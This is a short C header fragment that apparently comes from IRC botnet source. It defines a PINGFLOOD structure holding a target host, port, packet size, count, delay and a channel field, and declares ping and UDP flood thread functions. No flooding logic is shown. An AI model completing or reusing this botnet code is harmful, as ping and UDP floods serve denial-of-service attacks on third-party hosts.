#if !defined NO_PING && !defined NO_UDP
 // ping/udp structure.
typedef struct PINGFLOOD 
{
	SOCKET sock;
	char chan[128];
	char host[128];
	int num;
	int size;
	int delay;
	int port;
	int threadnum;
	bool notice;
	bool silent;
	bool gotinfo;

} PINGFLOOD;
#endif

#ifndef NO_PING
DWORD WINAPI ping(LPVOID param);
#endif

#ifndef NO_UDP
DWORD WINAPI udp(LPVOID param);
#endif

